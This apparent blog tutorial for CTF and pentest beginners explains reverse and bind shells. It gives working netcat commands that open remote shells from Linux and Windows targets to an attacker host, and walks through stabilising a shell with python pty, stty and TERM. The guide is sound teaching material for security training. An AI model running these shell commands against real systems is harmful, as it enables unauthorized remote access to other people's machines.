---
title: 
date: 2024-10-17
categories: [Introduction Guide, CTF, Pentest]
tags: [reverse_shell, bind_shell, terminal, exploit, ctf, pentest, linux, windows]
---

## Overview
This guide provides an overview of shells, focusing on how attackers use reverse and bind shells to gain unauthorized access to target systems. Whether you're competing in Capture the Flag (CTF) exercises or conducting a penetration test, understanding how to establish and stabilize a shell is an essential skill.	

This guide will cover:
- A primer on what a shell is and why we want one
- Reverse shells
- Bind shells
- Stabilizing a reverse shell
- Further reading

## Shells  
A shell is a text-based program that allows interaction with a computer's operating system. This type of program is sometimes called a command line interface (CLI), command prompt, or terminal. On Linux-based OSs, the most popular shell is Bash, though other shells like zsh, fish, and csh are other examples of shells used on Linux and Unix based OSs. On Windows platforms, the command prompt (cmd) and PowerShell are the two main shells.

### Why do we want access to a shell?
Having access to a shell allows for more complex and comprehensive interaction with a computer. For example, if you log into a web based application and perform a search with your web browser, you send commands and receive information to and from a computer, but your means of interaction are highly limited. Web applications limit the types of data that can be interacted with and the types of commands that can be sent. For example, you can perform a query to a database or upload a specific filetype defined by the web application, but these capabilities alone are highly limited, especially in the context of a CTF or pentest engagement.

Once an attacker has access to a remote shell on a computer, they gain more control over that host. Attackers often acquire new sensitive information with this new level of access on a target host. In CTF exercises, often flags can be found once a connection to a basic remote shell has been established. In a pentest scenario, this is a serious finding, as attackers can even look for misconfigurations that allow them to elevate their permissions and/or look to pivot to other hosts to attack on the network.

In security assessments and CTF exercises, there are two types of remote shells:
1. reverse shells - the attacking host listen and the victim connects to the attacking host.
2. binds shells - the victim listens and the attacking host connect to them.

Both main examples in this guide use a program called `netcat` (often abbreviated to `nc`). `netcat` is often referred to as the networking Swiss army knife of Linux for its flexibility. Most importantly for our purposes, it allows users to open or connect to TCP or UDP ports.

## Reverse Shell
Reverse shells are very common in CTFs and internal assessments. They are probably used 95% of the time.
- attacker listens
	- `nc -nlvp 9999`
- target connects to attacking host 
	- Linux `nc 192.168.1.1 9999 -e /bin/bash`
	- Windows `nc.exe 192.168.1.1 9999 -e cmd.exe`

The order in which the commands are run matters. Make sure that the attacker is listening before the target connects back to the attacking host.

Here is a breakdown of the flags used in the attacker's listening command (`nc -nlvp 9999`) by reading the documentation from `nc`'s `man` page for each flag:
```
     -n      Do not perform domain name resolution.  If a name cannot be resolved without DNS, an error will be re‐ported.
```
DNS resolution is unlikely to be needed. This flag is optional.

```
     -l      Listen for an incoming connection rather than initiating a connection to a remote host.  The destination and port to listen on can be specified either as non-optional arguments, or with options -s and -p respectively.  Cannot be used together with -x or -z.  Additionally, any timeouts specified with the -w option are ignored.
```
The attacking host will be listening for the target to connect back with the shell. 

```
     -v      Produce more verbose output.
```
This flag adds verbose output, which is useful to see when things connect, or if things connect strangely.

``` 
     -p source_port
             Specify the source port nc should use, subject to privilege restrictions and availability.
```
The attacker needs to specify a port to listen on. This can be any arbitrary unused port.

Let's look at the target's `nc 192.168.1.1 9999 -e /bin/bash` command and see what the `nc` `man` page says about those flags:
```m
SYNOPSIS
        nc ... [destination] [port]
```
The first part of the documentation explains the basic usage for `nc`. A destination (in this case by IP address) and port field are required.

```
There is no -c or -e option in this netcat, but you still can execute a command after connection being established by redirecting file descriptors. Be cautious here because opening a port and let anyone connected execute arbitrary command on your site is DANGEROUS.
```
the `-e` command normally is for executing a command after a connection is established. In this case, the flag can be omitted, and `nc` will still execute the bash shell once the connection has been established. The documentation warns about the very vulnerability reverse shells exploit. The ability to execute a command, specifically a shell, is what makes this command so dangerous. Once there is a shell running, it allows for arbitrary command execution.

Reverse shells don't have to always execute bash. Sometimes a target host doesn't have bash installed; however, if it's available, bash is a convenient shell to use because of the extra features bash has over a regular `sh` shell, especially if the shell can be stabilized (more on that later).

The Windows version, `nc.exe 192.168.1.1 9999 -e cmd.exe`, does the same thing, but uses the `cmd.exe` command instead of a bash shell.

Not all targets will have `nc` installed. When this happens, the attacker will need to upload or install `nc` onto the system, or execute a reverse shell with some other networking tool. Thankfully, a reverse shell can be spawned with many commonly installed applications and tools. Bash, Perl, Python, PHP, and Java can all be used to create a reverse shell to connect to the `nc` listener. This cheat sheet is a very useful reference: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Bind Shells
Bind shells are usually used on external assessments. It is often easier to open a new port on the victim machine and connect to it than to make the external target reach your internal IP through your firewall and deal with port forwarding. 
- target listens
	- `nc -lvp 4444 -e /bin/bash`
- attacker connects
	- `nc 192.168.1.2 4444`

Notice that in both instances of reverse shells and bind shells, it's the target that executes `/bin/bash` after the connection has been established. The attacker wants the target to run a shell that the attacker will execute commands from within. 

A lot of the flags are the same as before. Let's quickly look at them again. On the target side:
`-l` tells `nc` that it will be run in listen mode
`-v` displays verbose output
`-p` specifies the port number to listen on
`-e /bin/bash` tells nc that once a connection has been completed, to run a bash shell

On the attacker side, simply specify the victim's IP address and port number

## Stabilizing Reverse Shells

Confirm the target has python installed:
``` shell
which python
```
or
```shell
which python3
```

In reverse shell:
```shell
python3 -c ‘import pty;pty.spawn(“/bin/bash”)’
```
This spawns a pseudo-terminal to simulate an interactive shell, improving usability.

Background the process with `Ctrl+z`

In attacker's host shell:
```shell
stty raw -echo; fg
```
This restores control to the reverse shell after backgrounding it.

In reverse shell:
```shell
export TERM=xterm
```
This ensures compatibility with terminal features, such as command history and tab completion.

## Further Reading
For more information on reverse and bind shells in a security context here are some more resources:
https://saeed0x1.medium.com/stabilizing-a-reverse-shell-for-interactive-access-a-step-by-step-guide-c5c32f0cb839
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

